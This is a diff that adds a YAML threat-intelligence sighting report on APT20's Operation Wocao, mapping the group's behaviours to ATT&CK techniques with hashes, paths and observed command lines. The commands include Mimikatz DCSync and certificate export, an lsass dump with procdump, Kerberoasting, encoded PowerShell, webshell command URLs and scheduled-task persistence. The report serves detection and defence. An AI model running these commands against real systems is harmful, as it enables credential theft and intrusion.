@@ -1,0 +1,1214 @@
+---
+header:
+  sightingReportId: c315d5c4-c171-4668-b50c-6e8b967f3235
+  status: wip
+  description: Operation Wocao
+  author: Jose Luis Sanchez Martinez (@Joseliyo_Jstnk)
+  acknowledgement: Fox-IT
+  tlp: white
+  threatInformation:
+    adversaries:
+    - APT20
+    malware:
+    - JexBoss
+    - Unknown webshell 
+    - XServer
+    - keylogger 
+    - OAKMZ.vbs 
+    tools:
+    - powershell.exe
+    - dir.exe
+    - Process Launcher
+    - CheckAdmin.exe 
+    - getos.py 
+    - Mimikatz
+    - PowerSploit
+    - net.exe
+    - wevtutil.exe
+    - WinRar.exe
+    - netstat.exe
+    - taskkill.exe
+    - SharpHound
+    - zos.exe 
+    - ntbscan
+    - iie.exe 
+    - dnsquery
+    - tasklist.exe
+    - ping.exe
+    - ipconfig.exe
+    - dnscmd.exe
+    lolbas:
+    - cmd.exe
+    - schtasks.exe
+    - cscript.exe
+    - sc.exe
+    - wmic.exe
+    - doscmd/copy
+    - procdump.exe
+    - doscmd/time
+    - doscmd/type
+    - doscmd/dir
+    - makecab.exe
+    - doscmd/del
+    - reg.exe
+    regions:
+      - Eastern Asia:
+        - China
+      - Northern America:
+        - United States of America
+      - Latin America:
+        - Brazil
+        - Mexico
+      - Southern Europe:
+        - Portugal
+        - Spain
+        - Italy
+        - France
+      - Northern Europe:
+        - United Kingdom
+      - Western Europe:
+        - Germany
+        - France
+    industries:
+    - financial sector
+threatSightings:
+  - sighting: Initial Access - Threat actors used webshells already on the servers and also used their own to gain initial access.
+    id: fba71e8f-7b6e-4f9f-8edf-28b4ced8033f
+    behaviors:
+    - behavior: Other threat actors not related to Operation Wocao deployed JexBoss webshells in the web servers. 
+      type: File Created
+      id: c35d89bb-3883-4e32-ad28-147b604e2475
+      weapon: JexBoss
+      files:
+        - name: jexws4.jsp
+          path: "#{webroot}\\jexws4\\jexws4.jsp"
+          extension: jsp
+          sha256: fdc94d0dedf6e53dd435d2b5eacb4c34923fadee50529db6f3de38c71f325e05
+        - name: jexinv4.jsp
+          path: "#{webroot}\\jexinv4\\jexinv4.jsp"
+          extension: jsp
+          sha256: a34a7430936ce37e78b995c321ff626933c364c50f1e7689aa1b0660432b4618
+      notes:
+      - These webshells were already installed before the installation of the other ones by threat actors of Operation Wocao.
+      - More info about the exploits https://github.com/joaomatosf/jexboss
+      - More info about the webshells https://www.cisa.gov/uscert/ncas/analysis-reports/AR18-312A
+      att&ck:
+        initialAccess:
+        - "T1190 - Exploit Public-Facing Application"
+        persistence:
+        - "T1505.003 - Server Software Component: Web Shell"
+    - behavior: To make connections between threat actors and webservers, they have to connect using HTTP and GET method along with a specific parameter
+      id: 4a0d440f-f479-4f26-80d3-db8c8a8ff56c
+      type: Network Accessed
+      weapon: JexBoss
+      connections:
+        - protocol: http
+          method: GET
+          direction: inbound
+          dstIp: 127.0.0.1 # The IP Address of the webserver
+          requestHeader: X-JEX # On the last version of JexBoss, checks for this header and, if present, uses the value of that header as the OS command
+          parameters:
+            - ppp
+          url: "http://#{webserver-ip}/jexws4/jexws4.jsp?ppp=#{url-encoded-OS-command}"
+        - protocol: http
+          method: GET
+          direction: inbound
+          dstIp: 127.0.0.1 # The IP Address of the webserver
+          requestHeader: X-JEX # On the last version of JexBoss, checks for this header and, if present, uses the value of that header as the OS command
+          parameters:
+            - ppp
+          url: "http://#{webserver-ip}/jexinv4/jexinv4.jsp?ppp=#{url-encoded-OS-command}"
+      notes:
+      - The parameter ppp is used to send the OS command and execute it on the victim system
+      att&ck:
+        commandAndControl:
+        - "T1071.001 - Application Layer Protocol: Web Protocols"
+    - behavior: Using the previous webshell, threat actors upload their own webshells
+      type: File Created
+      id: fafb5cba-f6de-4d8f-ab55-5226a3fde9a3
+      weapon: Unknown webshell
+      files:
+        - name: uknown
+          sha256: 08f87f8c64a4c98b0e99592a436d601249feeaec4a2c4effbf69a166e4f592a0
+      notes:
+      - This webshell is reported by Fox-IT in the page 12 of the report
+      - A simple password protected file uploader shell. The webshell is merely a form with a path and text input field. A password is required and given using a URL parameter.
+      att&ck:
+        persistence:
+        - "T1505.003 - Server Software Component: Web Shell"
+    - behavior: Using the previous webshell, threat actors upload another own webshell with more features
+      type: File Created
+      id: 2409f33b-9b22-4c84-88a2-3229612538fa
+      weapon: Unknown webshell
+      files:
+        - name: uknown
+          sha256: 2047e464627e36410b3458e23062f23eecbd383e7854b55b497ec8db017c0d5e
+      notes:
+      - This webshell is reported by Fox-IT in the page 12 of the report
+      - It supports command execution on both Unix and Windows hosts. The overall layout and some of the code matches the file upload shell
+      - Once this shell was deployed, all interaction with the existing JexBoss shell stopped
+      att&ck:
+        persistence:
+        - "T1505.003 - Server Software Component: Web Shell"
+    - behavior: A modified version of a publicly JSP sock tunnel was uploaded using the webshell
+      type: File Created
+      id: 4e6fbd3d-1866-4b29-80ac-3a114c40d8c0
+      weapon: Unknown webshell
+      files:
+        - name: uknown
+          sha256: 459910699497f2efe921a197e365fd5938af55378b3b20d2867ce171036fb675
+      notes:
+      - This webshell is reported by Fox-IT in the page 13 of the report
+      - All further interaction with the target system appears to have taken place through this socket tunnel
+      - The public version of this tunnel is here https://github.com/sensepost/reGeorg/blob/master/tunnel.jsp
+      att&ck:
+        commandAndControl:
+        - "T1095 - Non-Application Layer Protocol"
+    - behavior: The actor makes use of a reconnaissance script, written in Visual Basic Script (VBS), to retrieve detailed information from a system
+      type: File Created
+      id: d1df31ba-a33b-4dcf-b9ba-a6675cd207e3
+      weapon: Unknown webshell
+      files:
+        - name: OAKMZ.vbs
+          path: C:\\windows\\temp\\OAKMZ.vbs
+          sha256: d43251480775f224517f484686bc7ca39e532d900b86ebf6ed37da8ee13534a4
+      notes:
+      - This tool is reported by Fox-IT in the page 13 of the report. Some of the functions supported are the following.
+      - Volume drives and the type of drives (Removable disk, network disk, local disk etc.)
+      - List of accounts that have Administrator rights
+      - Device information (Manufacturer, Model etc.)
+      - Overview of installed software
+      - Recently executed software (MuiCache)
+      - Running processes
+      - Internet connectivity check
+      - List active user sessions
+      - List users in the administrator group
+      - Retrieve local network configuration
+      - Display all open connections and listening ports and corresponding processes
+      - List installed Windows patches, on which dates they were installed and by which user
+      att&ck:
+        commandAndControl:
+        - "T1095 - Non-Application Layer Protocol"
+  - sighting: Command and Control - Threat actors deploys XServer Backdoor
+    id: 23fff148-baaa-461a-b6f7-401eddc3fa0e
+    behaviors:
+    - behavior: The XServer backdoor is deployed on the victim system. Is a C# tool which is executed using PowerShell. 
+      type: File Created
+      id: e9de7e83-e954-4d35-80f1-71ad4512edab
+      weapon: XServer
+      files:
+        - name: test.ps1
+          path: "C:\\Windows\\Temp\\test.ps1" # The file is stored in the folder where the actor is working
+          vHash: 7596fdd04dba990373ab2f3da0c7dd3f
+          sha256: 6972ba198ed0d30de9f66be5777ecdba2d657078f138325ee6db225c20b29e6e
+      notes:
+      - The backdoor is typically Base64 encoded and zlib compressed.
+      - The backdoor can act as SOCKS5 Proxy, Proxy Chain and TLS-wrapped C&C.
+      - The backdoor supports different commands.
+      att&ck:
+        commandAndControl:
+        - "T1090 - Proxy"
+        - "T1090.003 - Proxy: Multi-hop Proxy"
+        - "T1095 - Non-Application Layer Protocol"
+    - behavior: XServer backdoor is executed using PowerShell
+      type: Process Created
+      id: 2c2d7892-5bb4-4895-9de9-60a4421d881a
+      weapon: powershell.exe
+      processes:
+        - process: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
+          cmdLine:
+          - "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe test.ps1"
+      notes:
+      - More info about a snippet of the code used in the page 24 of the report
+      - '$code = format(BASE64 ENCODED CUSTOM BACKDOOR") Add-Type $code; [agent]::Main($args);'
+      att&ck:
+        execution:
+        - "T1059.001 - Command and Scripting Interpreter: PowerShell"
+        defenseEvasion:
+        - "T1140 - Deobfuscate/Decode Files or Information"
+    - behavior: There are two ways used by XServer to execute commands on the victim system. This is the first one using cmd.exe
+      type: Process Created
+      id: 90a1c91e-342c-44c6-b119-7a02109c960f
+      weapon: XServer
+      processes:
+        - process: C:\\Windows\\System32\\cmd.exe
+          embedFilename: Cmd.Exe
+          parentProcess: "C:\\Windows\\Temp\\test.ps1" # This is the XServer backdoor
+          cmdLine:
+          - "C:\\Windows\\System32\\cmd.exe /c cd /d #{current working directory} & #{command to be executed}"
+      notes:
+      - When threat actors use cmd.exe to execute commands, always is the same pattern like the previous command line.
+      - The actor consistently uses C:\\Windows\\Temp as the working directory
+      att&ck:
+        execution:
+        - "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+    - behavior: There are two ways used by XServer to execute commands on the victim system. This is the second one, using API Calls
+      type: ApiInvoked
+      id: 1e5c4ba2-6182-427e-b547-30b0bfe7a5d5
+      weapon: XServer
+      apis:
+        - apiName: ShellExecute
+          moduleName: Shell32.dll
+          process: "C:\\Windows\\Temp\\test.ps1" # This is the XServer backdoor
+      notes:
+      - Commands can be executed using this API whereas the Cmd.exe process execution
+      att&ck:
+        execution:
+        - "T1106 - Native API"
+    - behavior: Two versions of Agent were found on the systems. One was written in C# and the other one in Python and compiled with py2exe.
+      type: File Created
+      id: d8afa4b4-551c-432e-8ba2-1ded116821fe
+      weapon: XServer
+      files:
+        - name: unknown c# Agent variant
+          sha256: 5cf61c0b865fd2ab897c72ff2cc01ac4c31ea9c50ecc3d47693f3482fd8f91d4
+        - name: unknown Python Agent variant
+          sha256: b2162d4cbeee907d1af13918900e6e4f13232d00915563d841aa7c904d94589c
+      notes:
+      - This backdoor supports two modes. 1. backconnect to a hardcoded IP and port  2. to act as a server and listen for incoming connections.
+      - The only difference is the method used to setup new connections, the rest of the functionality is similar to the equivalents found in XServer.
+      att&ck:
+        commandAndControl:
+        - "T1090.003 - Proxy: Multi-hop Proxy"
+  - sighting: Collection and Execution - Mutiple tools are deployed in the system to get information and execute processes
+    id: ea8c3361-18fb-485f-8156-fc9283ab2492
+    behaviors:
+    - behavior: A basic custom tool is deployed in the victim system to get info from files and directories
+      type: File Created
+      id: 953016c3-bdce-42b9-8dcd-35f42bc3826a
+      weapon: XServer
+      files:
+        - name: dir.exe
+          path: "C:\\Windows\\Temp\\dir.exe" 
+          sha256: c109ddd4f43bc38a50b07b4fc22fe568cced4fb4d8c5bd71546407c2c6219048
+      notes:
+      - This custom tool is used by the actor to create an orderly overview of all files in a given directory, recursively.
+      - For each directory, file information is retrieved, such as timestamps, and stored in a file as specified by an argument. Maximum recursion depth can also be specified using an argument.
+      - dir.exe [TargetPath] <Num (MaxDepth)> <SavePath>
+      att&ck:
+        discovery:
+        - "T1083 - File and Directory Discovery"
+    - behavior: The custom tool dir.exe is executed to get information from the directory set
+      type: Process Created
+      id: 125009eb-e784-4e2c-b7c3-d278488be8cb
+      weapon: dir.exe
+      processes:
+        - process: C:\\Windows\\Temp\\dir.exe
+          cmdLine: 
+          - "dir.exe C:\\ #{MaxDepth} #{SavePath}"
+      notes:
+      - The tool is executed to get information from different paths like the C Drive.
+      att&ck:
+        discovery:
+        - "T1083 - File and Directory Discovery"
+    - behavior: A custom process launcher tool was used to execute processes as a child of others already running
+      type: File Created
+      id: b530b98f-08c7-4def-9f91-961ee32aa673
+      weapon: Process Launcher
+      files:
+        - name: processlauncher.exe
+          path: "C:\\Windows\\Temp\\processlauncher.exe" 
+          sha256: 3016ea94e3c5bd7f9d8e503b1817491bcf9e2ee5bb82fc106aa5d692dd0ff5c6
+      notes:
+      - This tool injects code into a selected process that ends up using CreateProcessA lo launch the command as a child process of the selected process
+      - "Arguments: processlauncher.exe -p=PID -f=OUTPUT -e=PROCESS -pro"
+      - -p=PID Process ID to inject into.
+      - -f=OUTPUT Log file to write stdout to.
+      - -e=PROCESS inject into process by process name
+      - -pro launches the process directly (not as a child process) and does not write to a log file
+      att&ck:
+        defenseEvasion:
+        - "T1055 - Process Injection"
+    - behavior: Process Launcher use the Windows API to launch and inject processes if needed
+      type: ApiInvoked
+      id: 9dc9371c-dbdf-4a6a-ab52-4a9e98ca6fea
+      weapon: Process Launcher
+      apis:
+        - apiName: CreateProcessA
+          moduleName: Kernel32.dll
+      notes:
+      - Process Launcher use CreateProcessA to launch processes
+      att&ck:
+        execution:
+        - "T1106 - Native API"
+    - behavior: Threat actors deploy an old version checkadmin.exe to identify on local and remote computers privileged users
+      type: File Created
+      id: 8dc59e0f-5b36-4a78-a177-b8d42b79bcbd
+      weapon: CheckAdmin.exe
+      files:
+        - name: CheckAdmin.exe
+          path: "C:\\Windows\\Temp\\CheckAdmin.exe" 
+          sha256: 75ac4478c1729d1b5434724cf0c2bd53cc5940d251a4ca07b17c239c8f62da8d
+      notes:
+      - To get information you have to pass one or multiple IP addresses as argument, or a path to a file containing IP addresses.
+      att&ck:
+        discovery:
+        - "T1069.001 - Permission Groups Discovery: Local Groups"
+    - behavior: CheckAdmin is launched to get information about privileges on the local machine
+      type: Process Created
+      id: 3083ddec-d653-42e3-90cc-f455ca754d68
+      weapon: CheckAdmin.exe
+      processes:
+        - process: C:\\Windows\\Temp\\CheckAdmin.exe
+          cmdLine: 
+          - "checkadmin.exe 127.0.0.1 -all"
+      notes:
+      - The final output are the administrators of the local machine
+      - Parameter -all List users in *administra* or *Remote Desktop* groups.
+      att&ck:
+        discovery:
+        - "T1083 - File and Directory Discovery"
+    - behavior: Besides the old version of checkadmin.exe, threat actors deploy another new version of this tool less verbose
+      type: File Created
+      id: 2353d617-ed42-4018-b85c-d9f8bb142e3c
+      weapon: CheckAdmin.exe
+      files:
+        - name: CheckAdmin.exe
+          path: "C:\\Windows\\Temp\\CheckAdmin.exe" 
+          sha256: 5d01150ade4b302b9fd765fd0fb70aa17ee9cb9fcb219c2d270fd90ad8d01188
+      notes:
+      - This tool has new parameters and is less verbose at the time of show the results
+      att&ck:
+        discovery:
+        - "T1069.001 - Permission Groups Discovery: Local Groups"
+    - behavior: Threat actors deploy a custom tool to get information about OS versions of systems connected to the network sending SMB packets to every IP.
+      type: File Created
+      id: 6ae35d4e-5da6-499e-bb86-89e22aa4f443
+      weapon: getos.py
+      files:
+        - name: getos.py
+          path: "C:\\Windows\\Temp\\getos.py" 
+          sha256: a4a448d40aa8b4ff1d18de7a84b7fbc4c41c00062a56cd7c74ac443b61438f47
+      notes:
+      - The usage of this tool is the following
+      - "Usage: getos.py <ip-range|ip-file> [save-path]"
+    - behavior: The tool to get information about the OS was executed to retrieve such information
+      type: Process Created
+      id: 52c46a33-1544-4f0f-9b58-5bf0a2aa68e3
+      weapon: getos.py
+      processes:
+        - process: C:\\Windows\\Temp\\getos.py
+          cmdLine: 
+          - "getos.py #{ip-range} #{save-path}"
+      notes:
+      - The output is written to a file in the following format
+      - 10.199.4.101 DESKTOP-E21RATO Windows 10 Pro 14393
+      att&ck:
+        discovery:
+        - "T1082 - System Information Discovery"
+    - behavior: getos.py uses SMB to get information from remote systems
+      id: 6235d5f4-2a4d-4dbb-92ca-70440cc80710
+      type: Network Accessed
+      weapon: getos.py
+      connections:
+        - protocol: smb
+          dstPort: 445
+          direction: outbound
+          dstIp: "#{internal-network}"
+          process: C:\\Windows\\Temp\\getos.py
+      att&ck:
+        discovery:
+        - "T1018 - Remote System Discovery"
+    - behavior: A custom keylogger was used to obtain password for the victims. This keylogger logs the victim's keystrokes and clipboard in plaintext file.
+      type: File Created
+      id: 1e21819e-7fcc-4cd2-bd61-45134fd5faae
+      weapon: keylogger
+      files:
+        - name: tap.tmp
+          path: c:\\windows\\temp\\tap.tmp
+          process: keylogger
+        - name: mrteeh.tmp
+          path: c:\\windows\\temp\\mrteeh.tmp
+          process: keylogger
+      notes:
+      - Both paths are used by the keylogger to store the data
+      att&ck:
+        credentialAccess:
+        - "T1056.001 - Input Capture: Keylogging"
+    - behavior: Cmd.exe is executed to load a command received from the webshell to spawn schtasks.exe
+      type: Process Created
+      id: 1c8d5839-fcde-4197-ab89-ead9189b7fdb
+      weapon: cmd.exe
+      processes:
+        - process: C:\\Windows\\System32\\cmd.exe
+          cmdLine: 
+          - 'cmd.exe /c cd /d c:\\temp & schtasks /create /u <DOMAIN>\<USERNAME> /p "<PASSWORD>" /ru system /sc daily /tr "cmd /c powershell.exe -ep bypass -file c:\\s.ps1" /tn win32times /f'
+      att&ck:
+        execution:
+        - "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+    - behavior: Scheduled tasks is used to execute malicious code
+      type: Process Created
+      id: 24ff22f3-b43c-411a-b614-d78ac101a821
+      weapon: schtasks.exe
+      processes:
+        - process: C:\\Windows\\System32\\schtasks.exe
+          parentProcess: C:\\Windows\\System32\\cmd.exe
+          cmdLine: 
+          - 'schtasks /create /u <DOMAIN>\<USERNAME> /p "<PASSWORD>" /ru system /sc daily /tr "cmd /c powershell.exe -ep bypass -file c:\\s.ps1" /tn win32times /f'
+      notes:
+      - The actor uses scheduled tasks to execute malicious code, typically PowerShell, to remote systems using credentials of privileged accounts. 
+      att&ck:
+        execution:
+        - "T1053.005 - Scheduled Task/Job: Scheduled Task"
+    - behavior: The task is created in the system
+      type: Scheduled Task Creation
+      id: 26168045-0c39-4b5d-8ccb-8013a180216b
+      weapon: schtasks.exe
+      scheduledTasks:
+        - commands: "cmd /c powershell.exe -ep bypass -file c:\\s.ps1"
+          name: win32times
+      notes:
+      - The actor attempts to mislead the victim with the name of the task
+      - You can get more in event ID 4698 
+      att&ck:
+        execution:
+        - "T1053.005 - Scheduled Task/Job: Scheduled Task"
+    - behavior: The scheduled task is executed using PowerShell
+      type: Process Created
+      id: ef2d7161-f2f9-4ae6-a9c7-68e314558388
+      weapon: powershell.exe
+      processes:
+        - process: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
+          parentProcess: C:\\Windows\\System32\\svchost.exe
+          cmdLine: 
+          - 'powershell.exe c:\\s.ps1'
+      notes:
+      - This is the execution of the scheduled task 
+      att&ck:
+        execution:
+        - "T1053.005 - Scheduled Task/Job: Scheduled Task"
+    - behavior: After executing the PowerShell code, the scheduled task is removed, to limit traces on thecompromised system
+      type: Process Created
+      id: a69f9f31-0e2d-4d93-87b1-51ecdcf3a68b
+      weapon: schtasks.exe
+      processes:
+        - process: C:\\Windows\\System32\\schtasks.exe
+          parentProcess: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
+          cmdLine: 
+          - 'schtasks /delete /u <DOMAIN>\<USERNAME> /p "<PASSWORD>" /tn win32times /s <IP ADDRESS> /f'
+      notes:
+      - The powershell script can call schtasks to remove the scheduled task
+      att&ck:
+        execution:
+        - "T1059.001 - Command and Scripting Interpreter: PowerShell"
+    - behavior: The task is removed from the s ystem
+      type: Scheduled Task Changed
+      id: f53b3535-956f-4ac7-9404-cd90526bdd16
+      weapon: schtasks.exe
+      scheduledTasks:
+        - commands: "cmd /c powershell.exe -ep bypass -file c:\\s.ps1"
+          name: win32times
+          action: delete
+      notes:
+      - You can get more info in event ID 4699
+      att&ck:
+        defenseEvasion:
+        - "T1070 - Indicator Removal"
+    - behavior: The VBS Script which was created in the initial stage, is executed using cscript.exe
+      type: Process Created
+      id: 48c7b86e-b0d7-414c-81b3-21c1797417ad
+      weapon: cscript.exe
+      processes:
+        - process: C:\\Windows\\System32\\cscript.exe
+          cmdLine:
+          - "cscript c:\\windows\\temp\\OAKMZ.vbs c:\\windows\\temp\\OAKMZ.txt"
+      notes:
+      - Information obtained from this script is stored in the text file of the command line
+      att&ck:
+        execution:
+        - "T1059.005 - Command and Scripting Interpreter: Visual Basic"
+    - behavior: A text file is created to store the information from the VBS Script
+      type: File Created
+      id: 12c6e0dc-e680-466e-a3c0-fa096be09fc6
+      weapon: OAKMZ.vbs
+      files:
+        - name: OAKMZ.txt
+          path: c:\\windows\\temp\\OAKMZ.txt
+    - behavior: Cmd.exe is executed to load a command received from the webshell to create a service using sc
+      type: Process Created
+      id: 33c35415-a7a5-4b14-91dd-ac93e39d99a9
+      weapon: cmd.exe
+      processes:
+        - process: C:\\Windows\\System32\\cmd.exe
+          cmdLine: 
+          - 'cmd.exe /c cd /d c:\\windows\\temp & sc \\\\<IP ADDRESS> create win32times binPath= "cmd /c start c:\\windows\\temp\\x.bat"'
+        - process: C:\\Windows\\System32\\cmd.exe
+          cmdLine: 
+          - 'cmd.exe /c cd /d c:\\windows\\temp & sc \\\\<IP ADDRESS> query server'
+      att&ck:
+        execution:
+        - "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+    - behavior: Sc.exe is spawned to create services
+      type: Process Created
+      id: d61ff703-098a-4a3a-9776-6fac8e124576
+      weapon: sc.exe
+      processes:
+        - process: C:\\Windows\\System32\\sc.exe
+          parentProcess: C:\\Windows\\System32\\cmd.exe
+          cmdLine: 
+          - 'sc \\\\<IP ADDRESS> create win32times binPath= "cmd /c start c:\\windows\\temp\\x.bat"'
+        - process: C:\\Windows\\System32\\sc.exe
+          parentProcess: C:\\Windows\\System32\\cmd.exe
+          cmdLine: 
+          - 'sc \\\\<IP ADDRESS> query server'
+      att&ck:
+        persistence:
+        - "T1543.003 - Create or Modify System Process: Windows Service"
+    - behavior: The service is created in the system
+      type: Service Creation
+      id: 1834a28d-5d4e-4572-b1b6-c63cf9ca1846
+      weapon: sc.exe
+      services:
+        - name: win32times
+          path: cmd /c start c:\\windows\\temp\\x.bat
+          process: C:\\Windows\\System32\\sc.exe
+      att&ck:
+        persistence:
+        - "T1543.003 - Create or Modify System Process: Windows Service"
+    - behavior: WMI is used to get information from the system
+      type: Process Created
+      id: afe423ab-bb7b-4cb1-8949-08f20a12f71f
+      weapon: wmic.exe
+      processes:
+        - process: C:\\Windows\\system32\\wbem\\WMIC.exe
+          parentProcess: C:\\Windows\\System32\\cmd.exe
+          cmdLine: 
+          - 'wmic os get lastbootuptime'
+      att&ck:
+        execution:
+        - "T1047 - Windows Management Instrumentation"
+    - behavior: Threat actors overwrite ps1 files created previously with a legitimate DLL to hide its steps
+      type: Process Created
+      id: 8ce0bc91-0a91-4f30-8d03-27665f87f878
+      weapon: doscmd/copy
+      processes:
+        - process: C:\\Windows\\System32\\cmd.exe
+          cmdLine: 
+          - 'copy \\\\<IP ADDRESS>\\c$\\windows\\system32\\devmgr.dll \\\\<IPADDRESS>\\c$\\windows\\temp\\LMAKSW.ps1 /y'
+      notes:
+      - The objective here is do not delete the file, but overwrite the content with legitimate Windows Files
+    - behavior: Encoded commands in base64 are executed on the system using PowerShell
+      type: Process Created
+      id: 6735a17f-ece6-4ba9-96fe-0bc2077c7a7d
+      weapon: powershell.exe
+      processes:
+        - process: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
+          cmdLine: 
+          - 'powershell -exec bypass -enc JgAgAHsASQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAGMAOgBcAHQAZQBtAHAAXABpAGsALgBwAHMAMQA7ACAARwBlAHQALQBEAG8AbQBhAGkAbgBVAHMAZQByACAALQBTAFAATgAgAHwAIABHAGUAdAAtAEQAbwBtAGEAaQBuAFMAUABOAFQAaQBjAGsAZQB0ACAALQBPAHUAdABwA HUAdABGAG8AcgBtAGEAdAAgAEgAYQBzAGgAYwBhAHQAfQA= > rs.txt'
+        - process: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
+          cmdLine: 
+          - '$DeflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream]'
+          - '[Convert]::FromBase64String'
+          - '($encfile),[IO.Compression.CompressionMode]::Decompress)'
+        - process: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
+          cmdLine: 
+          - 'function format([string]$source){$tt = "";$bb = [System.Convert]::FromBase64String($source);foreach($c in $bb){$tt = $tt + [char]($c -bxor 37 + 1);}return $tt;}'
+      att&ck:
+        defenseEvasion:
+        - "T1027 - Obfuscated Files or Information"
+        execution:
+        - "T1059.001 - Command and Scripting Interpreter: PowerShell"
+    - behavior: Threat Actors uses Mimikatz to dump credentials of accounts with elevated privileges
+      type: Process Created
+      id: 176d9579-c01e-4a57-b21f-52f6c2a8a5ff
+      weapon: Mimikatz
+      processes:
+        - process: C:\\Windows\\temp\\mimikatz
+          parentProcess: C:\\Windows\\System32\\cmd.exe
+          cmdLine: 
+          - 'echo "log c:\\windows\\temp\\xx.txt" privilege::debug "lsadump::dcsync /all /csv /domain:AD.local /dc:DC.AD.local" exit > c:\\mrt.ini'
+      att&ck:
+        credentialAccess:
+        - "T1003.006 - OS Credential Dumping: DCSync"
+    - behavior: A file is created with the execution of Mimikatz lsadump
+      type: File Created
+      id: d77dd473-bb1f-4285-8b8c-95453591960b
+      weapon: Mimikatz
+      files:
+        - name: mrt.ini
+          path: c:\\mrt.ini
+      notes:
+      - Results from the lsadump::dcsync are stored in this file
+    - behavior: Another way to dump credentials from LSASS process used by threat actors is using ProcDump
+      type: Process Created
+      id: 6ac39332-2ea3-44f6-a04b-3ec8cba7c868
+      weapon: procdump.exe
+      processes:
+        - process: C:\\windows\\temp\\zao.exe
+          embedFilename: procdump
+          parentProcess: C:\\Windows\\System32\\cmd.exe
+          cmdLine: 
+          - 'C:\\windows\\temp\\zao.exe /accepteula -ma lsass.exe zao.a'
+      notes:
+      - The procdump binary was renamed to zao.exe
+      att&ck:
+        credentialAccess:
+        - "T1003.001 - OS Credential Dumping: LSASS Memory"
+    - behavior: To be able to bruteforce the passwords of Windows service accounts , the actor uses PowerSploits Invoke-Kerberoast module to request encrypted service tickets
+      type: Process Created
+      id: 5531fc08-47f8-45cc-ac9d-b817081f61ab
+      weapon: PowerSploit
+      processes:
+        - process: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
+          cmdLine:
+          - '{Import-Module C:\\temp\\ik.ps1; Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat}' 
+      att&ck:
+        credentialAccess:
+        - "T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting"
+    - behavior: Threat actor use Mimikatz to dump certificates and private keys from Windows certificate stores.
+      type: Process Created
+      id: ff4cc3c9-44df-42d4-b1e6-f139e5a1ce9f
+      weapon: Mimikatz
+      processes:
+        - process: C:\\Windows\\temp\\mimikatz
+          parentProcess: C:\\Windows\\System32\\cmd.exe
+          cmdLine: 
+          - 'echo "log c:\\windows\\temp\\zaw.txt" privilege::debug crypto::cng crypto::capi "crypto::certificates /export" "crypto::certificates /systemstore:local_system / store:Root /export" exit > c:\\mrt.ini'
+        - process: C:\\Windows\\temp\\mimikatz
+          parentProcess: C:\\Windows\\System32\\cmd.exe
+          cmdLine: 
+          - 'echo "log c:\\windows\\temp\\zaw.txt" privilege::debug crypto::cng crypto::capi "crypto::certificates /export" "crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE" exit > c:\\mrt.ini'
+      att&ck:
+        credentialAccess:
+        - "T1552.004 - Unsecured Credentials: Private Keys"
+    - behavior: Threat actor use net to retrieve information of a specific target
+      type: Process Created
+      id: 6777c80f-75d1-4054-b59a-9e9117bc1394
+      weapon: net.exe
+      processes:
+        - process: C:\\Windows\\System32\\net.exe
+          parentProcess: C:\\Windows\\System32\\cmd.exe
+          cmdLine: 
+          - 'net user <username> /domain'
+      att&ck:
+        discovery:
+        - "T1087.002 - Account Discovery: Domain Account"
+    - behavior: On compromised domain controllers the actor queries the Windows event logs to identify on which systems in the network highly privileged users are working
+      type: Process Created
+      id: d72d2210-55da-4936-8c8c-17d3af8ce88d
+      weapon: wevtutil.exe
+      processes:
+        - process: C:\\Windows\\System32\\wevtutil.exe
+          parentProcess: C:\\Windows\\System32\\cmd.exe
+          cmdLine:
+          - 'wevtutil qe security /q:"*[EventData[Data[@Name="TargetUserName"]="<username>"]]" /c:2'
+      att&ck:
+        collection:
+        - "T1005 - Data from Local System"
+    - behavior: Threat actors retrieves the current time of a compromised system
+      type: Process Created
+      id: 705b9037-c632-455a-8c0f-e4b754272b32
+      weapon: doscmd/time
+      processes:
+        - process: C:\\Windows\\System32\\cmd.exe
+          cmdLine:
+          - 'time /t'
+      att&ck:
+        discovery:
+        - "T1124 - System Time Discovery"
+    - behavior: Threat actors uses the C$ and IPC$ shares to access files on a remote system. 
+      type: Process Created
+      id: f90b23a3-a394-4408-a8ee-aec7e0440018
+      weapon: doscmd/type
+      processes:
+        - process: C:\\Windows\\System32\\cmd.exe
+          cmdLine:
+          - 'type \\<IP address>\c$\windows\system32\mimilsa.log'
+      att&ck:
+        collection:
+        - "T1039 - Data from Network Shared Drive"
+    - behavior: Threat actors uses the C$ and IPC$ shares to access files on a remote system. 
+      type: Process Created
+      id: 7ee61934-7b27-442e-801e-74267367f057
+      weapon: doscmd/dir
+      processes:
+        - process: C:\\Windows\\System32\\cmd.exe
+          cmdLine:
+          - 'dir \\<IP address>\IPC$'
+      att&ck:
+        discovery:
+        - "T1135 - Network Share Discovery"
+    - behavior: Makecab is used to create a self extracting archive
+      type: Process Created
+      id: e8f92007-8b03-40cf-817e-e3b3c32b254a
+      weapon: makecab.exe
+      processes:
+        - process: C:\\Windows\\System32\\makecab.exe
+          parentProcess: C:\\Windows\\System32\\cmd.exe
+          cmdLine:
+          - 'makecab zww.txt zww.a'
+      att&ck:
+        collection:
+        - "T1560.001 - Archive Collected Data: Archive via Utility"
+    - behavior: WinRar is used too to compress files. The WinRar used was renamed
+      type: Process Created
+      id: 61f88e6f-ab57-45c4-8789-bd0a28edb056
+      weapon: WinRAR.exe
+      processes:
+        - process: C:\\Windows\\Temp\\za.exe
+          embedFilename: WinRAR.exe
+          parentProcess: C:\\Windows\\System32\\cmd.exe
+          cmdLine:
+          - 'za.exe a za.a -r c:\\users\\<username>\\desktop\\*.xlsx'
+        - process: C:\\Windows\\Temp\\zoo.exe
